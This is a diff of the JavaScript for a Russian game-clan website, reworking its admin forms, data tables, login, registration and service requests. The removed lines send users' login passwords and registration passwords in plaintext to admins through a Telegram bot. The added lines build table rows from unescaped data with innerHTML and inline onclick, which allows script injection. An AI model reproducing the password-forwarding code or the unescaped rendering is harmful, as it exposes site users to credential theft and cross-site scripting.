@@ -1932,16 +1932,16 @@
                         title = isEdit ? 'Редактировать ивент' : 'Создать ивент';
                         formHTML = `
                             <div class="form-group">
-                                <label class="form-label">Название</label>
+                                <label class="form-label">Название ивента</label>
                                 <input type="text" class="form-input" id="editEventName" value="${isEdit ? item.name : ''}" required>
                             </div>
                             <div class="form-group">
                                 <label class="form-label">Дата и время</label>
-                                <input type="datetime-local" class="form-input" id="editEventDate" value="${isEdit ? item.date.replace(' ', 'T') : ''}" required>
+                                <input type="datetime-local" class="form-input" id="editEventDate" value="${isEdit ? formatDateTimeForInput(item.date) : ''}" required>
                             </div>
                             <div class="form-group">
-                                <label class="form-label">Макс. участников</label>
-                                <input type="number" class="form-input" id="editEventMax" value="${isEdit ? item.participants.split('/')[1] : '20'}" required>
+                                <label class="form-label">Максимум участников</label>
+                                <input type="number" class="form-input" id="editEventMaxParticipants" value="${isEdit ? item.participants.split('/')[1] : '20'}" required>
                             </div>
                             <div class="form-group">
                                 <label class="form-label">Статус</label>
@@ -1958,7 +1958,7 @@
                         title = isEdit ? 'Редактировать предмет' : 'Добавить предмет';
                         formHTML = `
                             <div class="form-group">
-                                <label class="form-label">Название</label>
+                                <label class="form-label">Название предмета</label>
                                 <input type="text" class="form-input" id="editItemName" value="${isEdit ? item.name : ''}" required>
                             </div>
                             <div class="form-group">
@@ -1972,7 +1972,8 @@
                                     <option value="Оружие" ${isEdit && item.category === 'Оружие' ? 'selected' : ''}>Оружие</option>
                                     <option value="Броня" ${isEdit && item.category === 'Броня' ? 'selected' : ''}>Броня</option>
                                     <option value="Инструменты" ${isEdit && item.category === 'Инструменты' ? 'selected' : ''}>Инструменты</option>
-                                    <option value="Прочее" ${isEdit && item.category === 'Прочее' ? 'selected' : ''}>Прочее</option>
+                                    <option value="Еда" ${isEdit && item.category === 'Еда' ? 'selected' : ''}>Еда</option>
+                                    <option value="Другое" ${isEdit && item.category === 'Другое' ? 'selected' : ''}>Другое</option>
                                 </select>
                             </div>
                         `;
@@ -1981,26 +1982,44 @@
                 
                 adminModalTitle.textContent = title;
                 adminModalContent.innerHTML = `
-                    ${formHTML}
-                    <div class="form-group">
-                        <button class="form-submit" id="saveAdminData">${isEdit ? 'Сохранить' : 'Добавить'}</button>
-                    </div>
+                    <form id="adminEditForm">
+                        ${formHTML}
+                        <div class="form-group" style="margin-top: 30px;">
+                            <button type="submit" class="form-submit">${isEdit ? 'Сохранить изменения' : 'Добавить'}</button>
+                            <button type="button" class="btn" style="margin-top: 10px; width: 100%;" id="cancelEditBtn">Отмена</button>
+                        </div>
+                    </form>
                 `;
                 
-                // Add event listener for save button
-                document.getElementById('saveAdminData').onclick = () => saveAdminData(type, isEdit ? item.id : null);
+                // Add event listeners
+                const adminEditForm = document.getElementById('adminEditForm');
+                const cancelEditBtn = document.getElementById('cancelEditBtn');
+                
+                adminEditForm.onsubmit = (e) => {
+                    e.preventDefault();
+                    saveItem(type, item ? item.id : null);
+                };
+                
+                cancelEditBtn.onclick = () => {
+                    adminModal.style.display = 'none';
+                };
                 
                 adminModal.style.display = 'flex';
             }
             
-            // Save admin data
-            function saveAdminData(type, id) {
-                // Get form values
-                let newItem = {};
+            // Format date for datetime-local input
+            function formatDateTimeForInput(dateTimeStr) {
+                const date = new Date(dateTimeStr);
+                return date.toISOString().slice(0, 16);
+            }
+            
+            // Save item (add or edit)
+            function saveItem(type, id) {
+                let formData = {};
                 
                 switch (type) {
                     case 'member':
-                        newItem = {
+                        formData = {
                             nickname: document.getElementById('editNickname').value,
                             telegram: document.getElementById('editTelegram').value,
                             rank: document.getElementById('editRank').value,
@@ -2008,15 +2027,16 @@
                         };
                         break;
                     case 'event':
-                        newItem = {
+                        const maxParticipants = document.getElementById('editEventMaxParticipants').value;
+                        formData = {
                             name: document.getElementById('editEventName').value,
-                            date: document.getElementById('editEventDate').value.replace('T', ' '),
-                            participants: `0/${document.getElementById('editEventMax').value}`,
+                            date: document.getElementById('editEventDate').value,
+                            participants: `0/${maxParticipants}`,
                             status: document.getElementById('editEventStatus').value
                         };
                         break;
                     case 'warehouse':
-                        newItem = {
+                        formData = {
                             name: document.getElementById('editItemName').value,
                             quantity: document.getElementById('editItemQuantity').value,
                             category: document.getElementById('editItemCategory').value,
@@ -2026,23 +2046,26 @@
                 }
                 
                 if (id) {
-                    // Update existing item
+                    // Edit existing item
                     const index = mockData[type].findIndex(item => item.id === id);
                     if (index !== -1) {
-                        mockData[type][index] = { ...mockData[type][index], ...newItem };
+                        mockData[type][index] = { ...mockData[type][index], ...formData };
                     }
                 } else {
                     // Add new item
-                    newItem.id = mockData[type].length + 1;
-                    mockData[type].push(newItem);
+                    const newId = Math.max(...mockData[type].map(item => item.id)) + 1;
+                    mockData[type].push({
+                        id: newId,
+                        ...formData
+                    });
                 }
                 
-                alert('Данные сохранены!');
+                populateTable(`${type}Table`, mockData[type], type);
                 adminModal.style.display = 'none';
-                
-                // Reload tables
-                initializeAdminPanel();
                 updateStats();
+                
+                // Показать уведомление об успешном сохранении
+                alert(id ? 'Изменения сохранены!' : 'Элемент успешно добавлен!');
             }
             
             // Update statistics
@@ -2053,59 +2076,28 @@
                 document.getElementById('pendingRequests').textContent = mockData.requests.length;
             }
             
-            // Populate clan members modal
-            function populateClanMembersModal() {
+            // Initialize clan members modal
+            function initializeClanMembersModal() {
                 clanMembersTable.innerHTML = '';
                 
                 mockData.members.forEach(member => {
                     const row = document.createElement('tr');
                     
-                    const nicknameCell = document.createElement('td');
-                    nicknameCell.textContent = member.nickname;
-                    
-                    const telegramCell = document.createElement('td');
-                    telegramCell.textContent = member.telegram;
-                    
-                    const rankCell = document.createElement('td');
-                    rankCell.textContent = member.rank;
-                    
-                    const statusCell = document.createElement('td');
-                    statusCell.textContent = member.status;
-                    
-                    const actionsCell = document.createElement('td');
-                    actionsCell.className = 'action-buttons';
-                    
-                    if (isAdmin) {
-                        const editBtn = document.createElement('button');
-                        editBtn.className = 'action-btn edit-btn';
-                        editBtn.innerHTML = '<i class="fas fa-edit"></i>';
-                        editBtn.title = 'Редактировать';
-                        editBtn.onclick = () => {
-                            openEditModal('member', member);
-                            clanMembersModal.style.display = 'none';
-                        };
-                        
-                        const deleteBtn = document.createElement('button');
-                        deleteBtn.className = 'action-btn delete-btn';
-                        deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
-                        deleteBtn.title = 'Удалить';
-                        deleteBtn.onclick = () => {
-                            if (confirm(`Вы уверены, что хотите удалить участника ${member.nickname}?`)) {
-                                mockData.members = mockData.members.filter(m => m.id !== member.id);
-                                populateClanMembersModal();
-                                updateStats();
-                            }
-                        };
-                        
-                        actionsCell.appendChild(editBtn);
-                        actionsCell.appendChild(deleteBtn);
-                    }
-                    
-                    row.appendChild(nicknameCell);
-                    row.appendChild(telegramCell);
-                    row.appendChild(rankCell);
-                    row.appendChild(statusCell);
-                    row.appendChild(actionsCell);
+                    row.innerHTML = `
+                        <td>${member.nickname}</td>
+                        <td>${member.telegram}</td>
+                        <td>${member.rank}</td>
+                        <td>
+                            <span style="color: ${member.status === 'Активен' ? 'var(--success)' : 'var(--error)'}">
+                                ${member.status}
+                            </span>
+                        </td>
+                        <td>
+                            <button class="action-btn edit-btn" onclick="sendMessageToMember('${member.telegram}')">
+                                <i class="fas fa-paper-plane"></i>
+                            </button>
+                        </td>
+                    `;
                     
                     clanMembersTable.appendChild(row);
                 });
@@ -2114,59 +2106,32 @@
                 document.getElementById('activeMembersCount').textContent = mockData.members.filter(m => m.status === 'Активен').length;
             }
             
-            // Populate events modal
-            function populateEventsModal() {
+            // Initialize events modal
+            function initializeEventsModal() {
                 eventsListTable.innerHTML = '';
                 
                 mockData.events.forEach(event => {
                     const row = document.createElement('tr');
                     
-                    const nameCell = document.createElement('td');
-                    nameCell.textContent = event.name;
-                    
-                    const dateCell = document.createElement('td');
-                    dateCell.textContent = event.date;
-                    
-                    const participantsCell = document.createElement('td');
-                    participantsCell.textContent = event.participants;
-                    
-                    const statusCell = document.createElement('td');
-                    statusCell.textContent = event.status;
-                    
-                    const actionsCell = document.createElement('td');
-                    actionsCell.className = 'action-buttons';
-                    
-                    if (isAdmin) {
-                        const editBtn = document.createElement('button');
-                        editBtn.className = 'action-btn edit-btn';
-                        editBtn.innerHTML = '<i class="fas fa-edit"></i>';
-                        editBtn.title = 'Редактировать';
-                        editBtn.onclick = () => {
-                            openEditModal('event', event);
-                            eventsModal.style.display = 'none';
-                        };
-                        
-                        const deleteBtn = document.createElement('button');
-                        deleteBtn.className = 'action-btn delete-btn';
-                        deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
-                        deleteBtn.title = 'Удалить';
-                        deleteBtn.onclick = () => {
-                            if (confirm(`Вы уверены, что хотите удалить ивент ${event.name}?`)) {
-                                mockData.events = mockData.events.filter(e => e.id !== event.id);
-                                populateEventsModal();
-                                updateStats();
-                            }
-                        };
-                        
-                        actionsCell.appendChild(editBtn);
-                        actionsCell.appendChild(deleteBtn);
-                    }
-                    
-                    row.appendChild(nameCell);
-                    row.appendChild(dateCell);
-                    row.appendChild(participantsCell);
-                    row.appendChild(statusCell);
-                    row.appendChild(actionsCell);
+                    row.innerHTML = `
+                        <td>${event.name}</td>
+                        <td>${event.date}</td>
+                        <td>${event.participants}</td>
+                        <td>
+                            <span style="color: ${
+                                event.status === 'Запланирован' ? 'var(--warning)' : 
+                                event.status === 'В процессе' ? 'var(--primary)' : 
+                                'var(--success)'
+                            }">
+                                ${event.status}
+                            </span>
+                        </td>
+                        <td>
+                            <button class="action-btn edit-btn" onclick="joinEvent(${event.id})">
+                                <i class="fas fa-sign-in-alt"></i>
+                            </button>
+                        </td>
+                    `;
                     
                     eventsListTable.appendChild(row);
                 });
@@ -2175,59 +2140,24 @@
                 document.getElementById('activeEventsCount').textContent = mockData.events.filter(e => e.status === 'Запланирован' || e.status === 'В процессе').length;
             }
             
-            // Populate warehouse modal
-            function populateWarehouseModal() {
+            // Initialize warehouse modal
+            function initializeWarehouseModal() {
                 warehouseListTable.innerHTML = '';
                 
                 mockData.warehouse.forEach(item => {
                     const row = document.createElement('tr');
                     
-                    const nameCell = document.createElement('td');
-                    nameCell.textContent = item.name;
-                    
-                    const quantityCell = document.createElement('td');
-                    quantityCell.textContent = item.quantity;
-                    
-                    const categoryCell = document.createElement('td');
-                    categoryCell.textContent = item.category;
-                    
-                    const updatedCell = document.createElement('td');
-                    updatedCell.textContent = item.updated;
-                    
-                    const actionsCell = document.createElement('td');
-                    actionsCell.className = 'action-buttons';
-                    
-                    if (isAdmin) {
-                        const editBtn = document.createElement('button');
-                        editBtn.className = 'action-btn edit-btn';
-                        editBtn.innerHTML = '<i class="fas fa-edit"></i>';
-                        editBtn.title = 'Редактировать';
-                        editBtn.onclick = () => {
-                            openEditModal('warehouse', item);
-                            warehouseModal.style.display = 'none';
-                        };
-                        
-                        const deleteBtn = document.createElement('button');
-                        deleteBtn.className = 'action-btn delete-btn';
-                        deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
-                        deleteBtn.title = 'Удалить';
-                        deleteBtn.onclick = () => {
-                            if (confirm(`Вы уверены, что хотите удалить предмет ${item.name}?`)) {
-                                mockData.warehouse = mockData.warehouse.filter(w => w.id !== item.id);
-                                populateWarehouseModal();
-                                updateStats();
-                            }
-                        };
-                        
-                        actionsCell.appendChild(editBtn);
-                        actionsCell.appendChild(deleteBtn);
-                    }
-                    
-                    row.appendChild(nameCell);
-                    row.appendChild(quantityCell);
-                    row.appendChild(categoryCell);
-                    row.appendChild(updatedCell);
-                    row.appendChild(actionsCell);
+                    row.innerHTML = `
+                        <td>${item.name}</td>
+                        <td>${item.quantity}</td>
+                        <td>${item.category}</td>
+                        <td>${item.updated}</td>
+                        <td>
+                            <button class="action-btn edit-btn" onclick="requestItem(${item.id})">
+                                <i class="fas fa-hand-holding"></i>
+                            </button>
+                        </td>
+                    `;
                     
                     warehouseListTable.appendChild(row);
                 });
@@ -2235,462 +2165,351 @@
                 document.getElementById('totalItemsCount').textContent = mockData.warehouse.reduce((sum, item) => sum + parseInt(item.quantity), 0);
             }
             
-            // Switch between login and register tabs
+            // Send message to member
+            window.sendMessageToMember = function(telegram) {
+                const message = prompt(`Введите сообщение для ${telegram}:`);
+                if (message) {
+                    alert(`Сообщение отправлено ${telegram}: "${message}"`);
+                    // В реальном приложении здесь будет интеграция с Telegram API
+                }
+            };
+            
+            // Join event
+            window.joinEvent = function(eventId) {
+                const event = mockData.events.find(e => e.id === eventId);
+                if (event) {
+                    const [current, max] = event.participants.split('/').map(Number);
+                    if (current < max) {
+                        event.participants = `${current + 1}/${max}`;
+                        initializeEventsModal();
+                        alert(`Вы присоединились к ивенту "${event.name}"`);
+                    } else {
+                        alert('Ивент уже заполнен!');
+                    }
+                }
+            };
+            
+            // Request item
+            window.requestItem = function(itemId) {
+                const item = mockData.warehouse.find(i => i.id === itemId);
+                if (item) {
+                    const quantity = prompt(`Сколько "${item.name}" вы хотите запросить? (доступно: ${item.quantity})`);
+                    if (quantity && parseInt(quantity) > 0 && parseInt(quantity) <= parseInt(item.quantity)) {
+                        item.quantity = (parseInt(item.quantity) - parseInt(quantity)).toString();
+                        item.updated = new Date().toISOString().split('T')[0];
+                        initializeWarehouseModal();
+                        alert(`Вы получили ${quantity} ${item.name}`);
+                    } else if (quantity) {
+                        alert('Неверное количество!');
+                    }
+                }
+            };
+            
+            // Event Listeners
+            // Auth tabs
             authTabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const targetTab = this.getAttribute('data-tab');
+                tab.addEventListener('click', () => {
+                    const tabName = tab.getAttribute('data-tab');
                     
-                    // Update active tab
                     authTabs.forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
+                    authForms.forEach(f => f.classList.remove('active'));
                     
-                    // Show corresponding form
-                    authForms.forEach(form => {
-                        form.classList.remove('active');
-                        if (form.id === `${targetTab}Form`) {
-                            form.classList.add('active');
-                        }
-                    });
-                    
-                    // Hide success message when switching tabs
-                    successMessage.style.display = 'none';
-                    loadingMessage.style.display = 'none';
+                    tab.classList.add('active');
+                    document.getElementById(`${tabName}Form`).classList.add('active');
                 });
             });
             
-            // Switch between admin tabs
-            adminTabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const targetTab = this.getAttribute('data-tab');
-                    
-                    // Update active tab
-                    adminTabs.forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
-                    
-                    // Show corresponding content
-                    adminContents.forEach(content => {
-                        content.classList.remove('active');
-                        if (content.id === `${targetTab}Content`) {
-                            content.classList.add('active');
-                        }
-                    });
-                });
-            });
-            
-            // Login form submission
-            loginForm.addEventListener('submit', function(e) {
+            // Login form
+            loginForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 
                 const username = document.getElementById('loginEmail').value;
                 const password = document.getElementById('loginPassword').value;
                 
-                console.log('Отправка данных входа...');
-                
-                const message = `🔐 ВХОД В СИСТЕМУ\n🎮 Игрок: ${username || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}`;
-                
-                if (!username || !password) {
+                // Simple authentication
+                if (username && password) {
+                    currentUser = username;
+                    isAdmin = checkAdmin(username);
+                    
+                    updateUI();
+                    
+                    if (isAdmin) {
+                        initializeAdminPanel();
+                        updateStats();
+                    }
+                    
+                    // Reset form
+                    loginForm.reset();
+                } else {
                     alert('Пожалуйста, заполните все поля!');
-                    return;
                 }
-                
-                // Check if user is admin
-                isAdmin = checkAdmin(username);
-                currentUser = username;
-                
-                // Update UI
-                updateUI();
-                
-                // Send data to ALL admins
-                sendToAllAdmins(message)
-                .then(() => {
-                    showSuccessMessage();
-                    setTimeout(() => {
-                        successMessage.style.display = 'none';
-                        authForms.forEach(form => form.style.display = 'block');
-                        loadingMessage.style.display = 'none';
-                        updateUI();
-                        if (isAdmin) {
-                            adminPanel.style.display = 'block';
-                            mainContent.style.display = 'none';
-                        }
-                    }, 2000);
-                })
-                .catch(error => {
-                    console.error('Ошибка отправки:', error);
-                    alert('Ошибка отправки данных: ' + error.message);
-                });
             });
             
-            // Register form submission
-            registerForm.addEventListener('submit', function(e) {
+            // Register form
+            registerForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 
                 const username = document.getElementById('registerName').value;
                 const telegram = document.getElementById('registerEmail').value;
-                const level = document.getElementById('registerPhone').value;
+                const rank = document.getElementById('registerPhone').value;
                 const password = document.getElementById('registerPassword').value;
                 const confirmPassword = document.getElementById('registerConfirmPassword').value;
                 
-                console.log('Отправка данных регистрации...');
-                
-                // Проверка паролей
                 if (password !== confirmPassword) {
                     alert('Пароли не совпадают!');
                     return;
                 }
                 
-                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n📱 Telegram: ${telegram || 'Не указан'}\n⭐ Уровень: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}`;
-                
-                if (!username || !telegram || !level || !password) {
-                    alert('Пожалуйста, заполните все поля!');
-                    return;
-                }
-                
-                // Показать загрузку
-                showLoadingMessage();
-                
-                // Send data to ALL admins
-                sendToAllAdmins(message)
-                .then(() => {
-                    showSuccessMessage();
+                if (username && telegram && rank && password) {
+                    // Show loading
+                    document.querySelector('.auth-form.active').style.display = 'none';
+                    loadingMessage.style.display = 'block';
+                    
+                    // Simulate API request
                     setTimeout(() => {
-                        authTabs.forEach(t => t.classList.remove('active'));
-                        document.querySelector('[data-tab="login"]').classList.add('active');
-                        authForms.forEach(form => form.classList.remove('active'));
-                        document.getElementById('loginForm').classList.add('active');
-                        successMessage.style.display = 'none';
                         loadingMessage.style.display = 'none';
-                    }, 3000);
-                })
-                .catch(error => {
-                    console.error('Ошибка отправки:', error);
-                    alert('Ошибка отправки данных: ' + error.message);
+                        successMessage.style.display = 'block';
+                        
+                        // Add to mock requests
+                        const newRequest = {
+                            id: mockData.requests.length + 1,
+                            nickname: username,
+                            telegram: telegram,
+                            rank: rank,
+                            date: new Date().toISOString().split('T')[0]
+                        };
+                        
+                        mockData.requests.push(newRequest);
+                        
+                        // Send notification to admin
+                        sendTelegramNotification(`Новая заявка на вступление от ${username} (${telegram})`);
+                        
+                        // Reset form
+                        registerForm.reset();
+                    }, 2000);
+                } else {
+                    alert('Пожалуйста, заполните все поля!');
+                }
+            });
+            
+            // Send Telegram notification
+            function sendTelegramNotification(message) {
+                // В реальном приложении здесь будет отправка через Telegram Bot API
+                console.log('Telegram notification:', message);
+                
+                // Имитация отправки уведомлений администраторам
+                Object.values(ADMIN_CHAT_IDS).forEach(chatId => {
+                    console.log(`Отправка сообщения ${chatId}: ${message}`);
+                    // fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                 });
-            });
+            }
             
-            // Show login form when login button is clicked
-            loginBtn.addEventListener('click', function() {
-                authContainer.style.display = 'flex';
-                mainContent.style.display = 'none';
-                adminPanel.style.display = 'none';
-                
-                // Activate login tab
-                authTabs.forEach(t => t.classList.remove('active'));
-                document.querySelector('[data-tab="login"]').classList.add('active');
-                
-                authForms.forEach(form => form.classList.remove('active'));
-                document.getElementById('loginForm').classList.add('active');
-            });
-            
-            // Show register form when register button is clicked
-            registerBtn.addEventListener('click', function() {
-                authContainer.style.display = 'flex';
-                mainContent.style.display = 'none';
-                adminPanel.style.display = 'none';
-                
-                // Activate register tab
-                authTabs.forEach(t => t.classList.remove('active'));
-                document.querySelector('[data-tab="register"]').classList.add('active');
-                
-                authForms.forEach(form => form.classList.remove('active'));
-                document.getElementById('registerForm').classList.add('active');
-            });
-            
-            // Show admin panel
-            adminBtn.addEventListener('click', function() {
-                authContainer.style.display = 'none';
-                mainContent.style.display = 'none';
-                adminPanel.style.display = 'block';
-                initializeAdminPanel();
-                updateStats();
-            });
-            
-            // Logout
-            logoutBtn.addEventListener('click', function() {
-                currentUser = null;
-                isAdmin = false;
-                updateUI();
-                resetServiceSelection();
-            });
-            
-            // Services modal
-            servicesBtn.addEventListener('click', function() {
-                servicesModal.style.display = 'flex';
-            });
-            
-            closeServicesModal.addEventListener('click', function() {
-                servicesModal.style.display = 'none';
-                resetServiceSelection();
-            });
-            
-            closeAdminModal.addEventListener('click', function() {
-                adminModal.style.display = 'none';
-            });
-            
-            // Service selection
+            // Service options selection
             serviceOptions.forEach(option => {
-                option.addEventListener('click', function() {
-                    serviceOptions.forEach(opt => opt.classList.remove('selected'));
-                    this.classList.add('selected');
-                    selectedService = this.getAttribute('data-service');
+                option.addEventListener('click', () => {
+                    serviceOptions.forEach(o => o.classList.remove('selected'));
+                    option.classList.add('selected');
+                    selectedService = option.getAttribute('data-service');
                 });
             });
             
             // Send service request
-            sendServiceRequest.addEventListener('click', function() {
+            sendServiceRequest.addEventListener('click', () => {
                 const username = document.getElementById('serviceUsername').value;
                 
                 if (!username) {
-                    alert('Пожалуйста, укажите Telegram пользователя');
+                    alert('Пожалуйста, введите Telegram пользователя!');
                     return;
                 }
                 
                 if (!selectedService) {
-                    alert('Пожалуйста, выберите услугу');
+                    alert('Пожалуйста, выберите услугу!');
                     return;
                 }
                 
-                const serviceNames = {
-                    'protection': 'Защита терры',
-                    'resources': 'Поиск ресурсов',
-                    'project_help': 'Помощь в проекте',
-                    'kolbasa': 'Колбаса',
-                    'bot_creation': 'Создание ботов',
-                    'linux_help': 'Помощь в линуксе',
-                    'building_tips': 'Уроки строительства',
-                    'scene_creation': 'Создание сцен',
-                    'pvp_training': 'Обучение по PvP'
-                };
+                // Determine which admin to notify based on service
+                let adminToNotify = '';
+                const mvdServices = ['protection', 'resources', 'project_help', 'kolbasa'];
+                const mesServices = ['bot_creation', 'linux_help', 'building_tips', 'scene_creation', 'pvp_training'];
                 
-                const serviceName = serviceNames[selectedService] || selectedService;
-                
-                // Определяем администратора для услуги
-                let adminToContact = '';
-                let adminChatId = '';
-                
-                if (['protection', 'resources', 'project_help', 'kolbasa'].includes(selectedService)) {
-                    adminToContact = '@mvd_general_RF';
-                    adminChatId = ADMIN_CHAT_IDS.mvd_general_RF;
-                } else {
-                    adminToContact = '@mes_generall';
-                    adminChatId = ADMIN_CHAT_IDS.mes_generall;
+                if (mvdServices.includes(selectedService)) {
+                    adminToNotify = 'mvd_general_RF';
+                } else if (mesServices.includes(selectedService)) {
+                    adminToNotify = 'mes_generall';
                 }
                 
-                // Сообщение для администратора
-                const adminMessage = `🛎️ ЗАКАЗ УСЛУГИ\n👤 Пользователь: ${username}\n📋 Услуга: ${serviceName}\n👨‍💼 Администратор: ${adminToContact}\n⏰ Время: ${new Date().toLocaleString()}`;
-                
-                // Отправляем сообщение администратору
-                sendTelegramMessage(adminChatId, adminMessage)
-                .then(() => {
-                    alert('Заявка на услугу отправлена администратору! Теперь напишите ему в Telegram для уточнения деталей.');
+                if (adminToNotify) {
+                    const message = `Новый заказ услуги от ${username}\nУслуга: ${selectedService}\nАдминистратор: ${adminToNotify}`;
+                    sendTelegramNotification(message);
+                    alert(`Заявка отправлена администратору ${adminToNotify}!`);
                     servicesModal.style.display = 'none';
-                    resetServiceSelection();
-                })
-                .catch(error => {
-                    console.error('Ошибка отправки:', error);
-                    alert('Ошибка отправки заявки: ' + error.message);
+                    
+                    // Reset form
+                    document.getElementById('serviceUsername').value = '';
+                    serviceOptions.forEach(o => o.classList.remove('selected'));
+                    selectedService = null;
+                }
+            });
+            
+            // Admin tabs
+            adminTabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabName = tab.getAttribute('data-tab');
+                    
+                    adminTabs.forEach(t => t.classList.remove('active'));
+                    adminContents.forEach(c => c.classList.remove('active'));
+                    
+                    tab.classList.add('active');
+                    document.getElementById(`${tabName}Content`).classList.add('active');
                 });
             });
             
-            // Add member button
-            document.getElementById('addMemberBtn').addEventListener('click', function() {
-                openEditModal('member');
-            });
+            // Admin buttons
+            document.getElementById('addMemberBtn').addEventListener('click', () => openEditModal('member'));
+            document.getElementById('addEventBtn').addEventListener('click', () => openEditModal('event'));
+            document.getElementById('addItemBtn').addEventListener('click', () => openEditModal('warehouse'));
             
-            // Add event button
-            document.getElementById('addEventBtn').addEventListener('click', function() {
-                openEditModal('event');
-            });
-            
-            // Add item button
-            document.getElementById('addItemBtn').addEventListener('click', function() {
-                openEditModal('warehouse');
-            });
-            
-            // Donation button
-            donationBtn.addEventListener('click', function() {
-                donationModal.style.display = 'flex';
-            });
-            
-            closeDonationModal.addEventListener('click', function() {
-                donationModal.style.display = 'none';
-            });
-            
-            // Process donation
-            processDonation.addEventListener('click', function() {
-                const amount = document.getElementById('donationAmount').value;
-                const message = document.getElementById('donationMessage').value;
-                
-                if (!amount) {
-                    alert('Пожалуйста, укажите сумму взноса');
-                    return;
-                }
-                
-                const donationMessage = `💰 ВЗНОС В КЛАН\n👤 Пользователь: ${currentUser || 'Не указан'}\n💳 Сумма: ${amount} руб.\n📝 Комментарий: ${message || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}`;
-                
-                // Отправляем сообщение администраторам
-                sendToAllAdmins(donationMessage)
-                .then(() => {
-                    alert('Спасибо за ваш взнос! Информация отправлена администраторам. Они свяжутся с вами для уточнения деталей оплаты.');
-                    donationModal.style.display = 'none';
-                })
-                .catch(error => {
-                    console.error('Ошибка отправки:', error);
-                    alert('Ошибка отправки информации о взносе: ' + error.message);
-                });
-            });
-            
-            // Clan members button
-            clanMembersBtn.addEventListener('click', function() {
-                populateClanMembersModal();
-                clanMembersModal.style.display = 'flex';
-            });
-            
-            clanMembersBtn2.addEventListener('click', function() {
-                populateClanMembersModal();
-                clanMembersModal.style.display = 'flex';
-            });
-            
-            closeClanMembersModal.addEventListener('click', function() {
-                clanMembersModal.style.display = 'none';
-            });
-            
-            // Events button
-            eventsBtn.addEventListener('click', function() {
-                populateEventsModal();
-                eventsModal.style.display = 'flex';
-            });
-            
-            eventsBtn2.addEventListener('click', function() {
-                populateEventsModal();
-                eventsModal.style.display = 'flex';
-            });
-            
-            closeEventsModal.addEventListener('click', function() {
-                eventsModal.style.display = 'none';
-            });
-            
-            // Warehouse button
-            warehouseBtn.addEventListener('click', function() {
-                populateWarehouseModal();
-                warehouseModal.style.display = 'flex';
-            });
-            
-            closeWarehouseModal.addEventListener('click', function() {
-                warehouseModal.style.display = 'none';
-            });
-            
-            // Function to send message to ALL admins
-            async function sendToAllAdmins(message) {
-                console.log('📤 Отправка сообщения администраторам...');
-                
-                try {
-                    // Отправляем сообщение всем администраторам
-                    const sendPromises = Object.values(ADMIN_CHAT_IDS).map(chatId => 
-                        sendTelegramMessage(chatId, message)
-                    );
-                    
-                    await Promise.all(sendPromises);
-                    return true;
-                } catch (error) {
-                    console.error('❌ Ошибка отправки:', error);
-                    throw error;
-                }
-            }
-            
-            // Function to send message to Telegram
-            async function sendTelegramMessage(chatId, message) {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        })
-                    });
-                    
-                    const data = await response.json();
-                    
-                    if (data.ok) {
-                        console.log('✅ Сообщение отправлено в чат:', chatId);
-                        return true;
-                    } else {
-                        throw new Error(data.description || 'Ошибка Telegram');
-                    }
-                } catch (error) {
-                    throw new Error('Ошибка отправки: ' + error.message);
-                }
-            }
-            
-            // Function to show loading message
-            function showLoadingMessage() {
-                authForms.forEach(form => form.style.display = 'none');
-                successMessage.style.display = 'none';
-                loadingMessage.style.display = 'block';
-            }
-            
-            // Function to show success message
-            function showSuccessMessage() {
-                authForms.forEach(form => form.style.display = 'none');
-                loadingMessage.style.display = 'none';
-                successMessage.style.display = 'block';
-                console.log('✅ Показано сообщение об успехе');
-            }
-            
-            // Function to reset service selection
-            function resetServiceSelection() {
-                serviceOptions.forEach(opt => opt.classList.remove('selected'));
-                selectedService = null;
-                document.getElementById('serviceUsername').value = '';
-            }
-            
-            // Toggle Liquid Glass mode
+            // Theme toggle
             themeToggle.addEventListener('change', function() {
                 if (this.checked) {
                     document.body.classList.add('liquid-glass');
-                    // Проверка производительности
-                    checkPerformance();
+                    // Show performance warning after 3 seconds
+                    setTimeout(() => {
+                        performanceWarning.style.display = 'block';
+                        setTimeout(() => {
+                            performanceWarning.style.display = 'none';
+                        }, 5000);
+                    }, 3000);
                 } else {
                     document.body.classList.remove('liquid-glass');
-                    performanceWarning.style.display = 'none';
                 }
             });
             
-            // Проверка производительности
-            function checkPerformance() {
-                // Простая проверка производительности
-                let startTime = performance.now();
+            // Donation
+            donationBtn.addEventListener('click', () => {
+                donationModal.style.display = 'flex';
+            });
+            
+            closeDonationModal.addEventListener('click', () => {
+                donationModal.style.display = 'none';
+            });
+            
+            processDonation.addEventListener('click', () => {
+                const amount = document.getElementById('donationAmount').value;
+                const message = document.getElementById('donationMessage').value;
                 
-                // Выполняем простую операцию для проверки скорости
-                for (let i = 0; i < 1000000; i++) {
-                    Math.sqrt(i);
+                if (!amount || amount <= 0) {
+                    alert('Пожалуйста, введите корректную сумму!');
+                    return;
                 }
                 
-                let endTime = performance.now();
-                let executionTime = endTime - startTime;
+                alert(`Спасибо за взнос ${amount} руб.! Средства пойдут на развитие клана.`);
+                donationModal.style.display = 'none';
                 
-                // Если операция заняла слишком много времени, показываем предупреждение
-                if (executionTime > 50) {
-                    performanceWarning.style.display = 'block';
-                    setTimeout(() => {
-                        performanceWarning.style.display = 'none';
-                    }, 5000);
+                // Reset form
+                document.getElementById('donationAmount').value = '';
+                document.getElementById('donationMessage').value = '';
+            });
+            
